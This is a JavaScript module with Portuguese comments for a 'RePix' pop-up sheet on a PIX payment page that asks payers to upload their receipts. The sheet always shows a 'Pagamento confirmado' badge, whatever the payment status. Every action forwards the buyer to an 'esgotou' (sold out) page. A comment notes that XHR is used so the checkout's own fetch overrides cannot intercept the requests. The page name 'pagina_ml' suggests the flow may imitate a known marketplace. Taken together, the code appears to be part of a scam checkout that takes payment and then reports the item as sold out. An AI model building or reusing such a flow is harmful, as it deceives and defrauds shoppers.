/* RePix (pagina_ml): bottom-sheet (sobe de baixo) complementar na pagina do pagamento. Aparece 3s
 * depois do PIX (mesmo se ja aprovado). QUALQUER acao — enviar comprovante, pular ou fechar — avanca
 * pro esgotou (onDone). So NAO aparece se o RePix estiver DESLIGADO no painel (repix.ativo=false).
 *
 *   var rp = MLRepix.create({ api: '/api/repix.php' });
 *   rp.openSheet(paymentCode, function () { irParaEsgotou(); });  // onDone: avanca de qualquer jeito
 */
(function (w) {
  'use strict';

  function css() {
    if (document.getElementById('repix-css')) return;
    var s = document.createElement('style');
    s.id = 'repix-css';
    s.textContent =
      '.rpx-ov{position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.5);display:flex;align-items:flex-end;justify-content:center}' +
      '.rpx-sheet{width:100%;max-width:520px;background:#fff;color:#222;border-radius:16px 16px 0 0;box-shadow:0 -8px 30px rgba(0,0,0,.25);padding:18px 18px calc(18px + env(safe-area-inset-bottom));font-family:inherit;transform:translateY(100%);transition:transform .28s cubic-bezier(.22,.61,.36,1);max-height:90vh;overflow:auto}' +
      '.rpx-ov.on .rpx-sheet{transform:translateY(0)}' +
      '.rpx-grab{width:40px;height:4px;border-radius:999px;background:#e0e0e0;margin:0 auto 12px}' +
      '.rpx-badge{display:inline-block;font-size:11px;font-weight:600;color:#1f8f4e;background:#e9f7ef;border:1px solid rgba(31,143,78,.35);border-radius:4px;padding:3px 8px;margin-bottom:10px}' +
      '.rpx-t{font-size:18px;font-weight:700;margin:0 0 6px;color:#222}' +
      '.rpx-m{font-size:14px;line-height:1.45;color:#666;margin:0 0 14px}' +
      '.rpx-drop{display:block;border:1.5px dashed #d8d8d8;border-radius:10px;padding:18px 12px;text-align:center;cursor:pointer;color:#666;font-size:14px;background:#fafafa}' +
      '.rpx-drop.on{border-color:#1f8f4e;background:#e9f7ef}' +
      '.rpx-drop b{display:block;color:#1f8f4e;font-weight:600;margin:6px 0 2px}' +
      '.rpx-drop small{color:#999;font-size:12px}' +
      '.rpx-file{font-size:13px;color:#222;margin:8px 0 0;word-break:break-all}' +
      '.rpx-btn{display:block;width:100%;margin-top:14px;border:0;border-radius:10px;background:#1f8f4e;color:#fff;font-size:16px;font-weight:700;padding:14px 12px;cursor:pointer;font-family:inherit}' +
      '.rpx-btn[disabled]{opacity:.55;cursor:default}' +
      '.rpx-skip{display:block;width:100%;margin-top:8px;border:0;background:none;color:#888;font-size:14px;padding:10px;cursor:pointer;font-family:inherit;text-decoration:underline}' +
      '.rpx-msg{font-size:13px;line-height:1.4;margin-top:12px;min-height:1px}' +
      '.rpx-msg.err{color:#d9342b}.rpx-msg.ok{color:#1f8f4e;font-weight:600}' +
      '.rpx-load{display:flex;align-items:center;justify-content:center;font-size:13px;color:#666;margin-top:12px}' +
      '.rpx-spin{margin-right:8px;width:16px;height:16px;border:2px solid #e9f7ef;border-top-color:#1f8f4e;border-radius:50%;animation:rpxs .8s linear infinite}' +
      '@keyframes rpxs{to{transform:rotate(360deg)}}';
    document.head.appendChild(s);
  }

  function create(opts) {
    var api = opts.api;
    var st = { busy: false, done: false };

    function openSheet(code, onDone) {
      if (document.getElementById('rpx-ov')) return;
      // Mostra SEMPRE (ate aprovado). So NAO mostra se o RePix estiver DESLIGADO no painel.
      // XHR de proposito (nao e interceptado por overrides de fetch do checkout).
      var g = new XMLHttpRequest();
      g.open('GET', api + '?action=eligible&code=' + encodeURIComponent(code));
      g.onload = function () {
        var d = null; try { d = JSON.parse(g.responseText); } catch (e) {}
        if (d && d.reason === 'desligado') { if (onDone) onDone(); return; }
        buildSheet(code, onDone);
      };
      g.onerror = function () { buildSheet(code, onDone); }; // erro de rede: mostra assim mesmo
      g.send();
    }

    function buildSheet(code, onDone) {
      if (document.getElementById('rpx-ov')) return;
      css();
      var finish = function () { if (st.done) return; st.done = true; close(); if (onDone) onDone(); };

      var ov = document.createElement('div');
      ov.className = 'rpx-ov'; ov.id = 'rpx-ov';
      ov.innerHTML =
        '<div class="rpx-sheet" role="dialog" aria-modal="true" aria-labelledby="rpx-t">' +
          '<div class="rpx-grab"></div>' +
          '<span class="rpx-badge">Pagamento confirmado</span>' +
          '<h3 class="rpx-t" id="rpx-t">Anexe seu comprovante Pix</h3>' +
          '<p class="rpx-m">Para registrar e agilizar a liberacao do seu pedido, anexe o comprovante do seu Pix. Se preferir, voce pode continuar sem anexar.</p>' +
          '<label class="rpx-drop" id="rpx-drop">' +
            '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M12 16V4M7 9l5-5 5 5"/><path d="M4 16v3a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-3"/></svg>' +
            '<b>Toque para escolher o(s) comprovante(s)</b><small>Pode anexar varios. Imagem ou PDF, ate 10 MB cada</small>' +
            '<input type="file" id="rpx-in" accept="image/*,application/pdf" multiple style="display:none">' +
            '<div class="rpx-file" id="rpx-file"></div>' +
          '</label>' +
          '<button type="button" class="rpx-btn" id="rpx-send" disabled>Enviar comprovante</button>' +
          '<button type="button" class="rpx-skip" id="rpx-skip">Pular e continuar</button>' +
          '<div class="rpx-msg" id="rpx-msg"></div>' +
        '</div>';
      document.body.appendChild(ov);
      requestAnimationFrame(function () { ov.classList.add('on'); });

      var inp = document.getElementById('rpx-in'), drop = document.getElementById('rpx-drop');
      var btn = document.getElementById('rpx-send'), msg = document.getElementById('rpx-msg');
      var chosen = [];

      function pick(files) {
        msg.className = 'rpx-msg'; msg.textContent = '';
        if (!files || !files.length) return;
        var ok = [];
        for (var i = 0; i < files.length; i++) { if (files[i].size <= 10485760) ok.push(files[i]); }
        if (ok.length < files.length) { msg.className = 'rpx-msg err'; msg.textContent = 'Alguns arquivos passam de 10 MB e foram ignorados.'; }
        chosen = ok;
        document.getElementById('rpx-file').textContent = chosen.length === 0 ? '' : (chosen.length === 1 ? chosen[0].name : chosen.length + ' arquivos selecionados');
        btn.disabled = chosen.length === 0;
      }
      function send() {
        if (!chosen.length || st.busy) return;
        st.busy = true; btn.disabled = true;
        msg.className = 'rpx-load'; msg.innerHTML = '<span class="rpx-spin"></span><span>Enviando comprovante(s)...</span>';
        // Envia um por vez; ao terminar AVANCA pro esgotou de qualquer jeito (complementar).
        var i = 0, okCount = 0;
        function next() {
          if (i >= chosen.length) {
            st.busy = false;
            msg.className = 'rpx-msg ok';
            msg.textContent = okCount > 0 ? 'Comprovante recebido! Liberando seu pedido...' : 'Pronto! Liberando seu pedido...';
            setTimeout(finish, 900);
            return;
          }
          var fd = new FormData(); fd.append('file', chosen[i++]);
          var xhr = new XMLHttpRequest();
          xhr.open('POST', api + '?action=proof&code=' + encodeURIComponent(code));
          xhr.onload = function () { var d = null; try { d = JSON.parse(xhr.responseText); } catch (e) {} if (d && d.approved === true) okCount++; next(); };
          xhr.onerror = function () { next(); };
          xhr.send(fd);
        }
        next();
      }

      inp.addEventListener('change', function () { pick(inp.files); });
      drop.addEventListener('dragover', function (e) { e.preventDefault(); drop.classList.add('on'); });
      drop.addEventListener('dragleave', function () { drop.classList.remove('on'); });
      drop.addEventListener('drop', function (e) { e.preventDefault(); drop.classList.remove('on'); pick(e.dataTransfer && e.dataTransfer.files); });
      btn.addEventListener('click', send);
      document.getElementById('rpx-skip').addEventListener('click', function () { if (!st.busy) finish(); });
      ov.addEventListener('click', function (e) { if (e.target === ov && !st.busy) finish(); });
    }

    function close() {
      var ov = document.getElementById('rpx-ov');
      if (!ov) return;
      ov.classList.remove('on');
      setTimeout(function () { if (ov.parentNode) ov.parentNode.removeChild(ov); }, 280);
    }

    return { openSheet: openSheet };
  }

  w.MLRepix = { create: create };
})(window);
